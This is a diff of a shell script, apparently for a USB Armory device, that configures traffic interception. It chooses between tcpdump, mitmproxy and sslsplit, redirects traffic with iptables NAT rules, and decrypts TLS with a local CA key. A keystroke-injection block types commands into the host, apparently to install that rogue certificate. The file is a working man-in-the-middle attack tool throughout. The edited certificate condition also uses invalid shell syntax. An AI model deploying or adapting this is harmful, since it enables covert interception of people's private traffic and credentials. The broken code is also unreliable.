@@ -12,13 +12,13 @@ export delay=0.1
 # 0 = no sniff
 # 1 = tcpdump
 # 2 = mitmproxy
-# 3 = sslsplit Not working automatic! (TODO: Fix problem with run as daemon in background!)
+# 3 = sslsplit
 
 export sniffprog=0
 #--------------------------------------
 # Certificate:
 # 0 = install no certificate
-# 1 = install certificate
+# 1 = install certificate (only with Sniffprog mitmproxy!!!)
 
 export cert=0
 #-------------------------------------
@@ -40,7 +40,8 @@ elif [ "$sniffprog" -eq 2 ]; then
 	sleep 4
 
 	# Start mitmdump for HTTP/HTTPS
-	mitmdump -T --host -q -w /home/usbarmory/SniffedFiles/mitmdump-$FILECOUNT &
+	#sudo mitmdump -T --host -q -w /home/usbarmory/SniffedFiles/mitmdump-$FILECOUNT &>/home/usbarmory/mitmdumplog.txt &
+	sudo mitmdump -T --host -q -w /home/usbarmory/SniffedFiles/mitmdump-$FILECOUNT &
 elif [ "$sniffprog" -eq 3 ]; then
 	# most common ports	
 	sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
@@ -54,12 +55,19 @@ elif [ "$sniffprog" -eq 3 ]; then
 
 	sleep 4
 
-	./sslsplit -D -l /home/usbarmory/SniffedFiles/sslsplit-$FILECOUNT.log -j /home/usbarmory/SniffedFiles/sslsplit/ -S logdir/ -k /home/usbarmory/certificate/ca-key.pem -c /home/usbarmory/certificate/ca-root.pem ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 &
+	sudo /home/usbarmory/sslsplit \
+		-l /home/usbarmory/SniffedFiles/sslsplit-$FILECOUNT.log \
+		-j /home/usbarmory/SniffedFiles/sslsplit/ \
+		-S logdir/ \
+		-k /home/usbarmory/certificate/ca-key.pem \
+		-c /home/usbarmory/certificate/ca-root.pem \
+		ssl 0.0.0.0 8443 \
+		tcp 0.0.0.0 8080 & 
 fi
 
 
 # Certificate
-if [ "$cert" -eq 1 ]; then
+if [ "$cert" -eq 1 && "$sniffprog" -eq 2 ]; then
 
 	sleep 8
 	$p2p "\\\"\c\at\\\"" $lang
@@ -84,7 +92,7 @@ if [ "$cert" -eq 1 ]; then
 	$p2p "\t" $lang
 	sleep $delay
 	$p2p "\n" $lang
-	sleep $delay
+	sleep 0.5
 	$p2p "\\\"\cq\\\"" $lang
 	sleep 1
 	$p2p "exit\\n" $lang
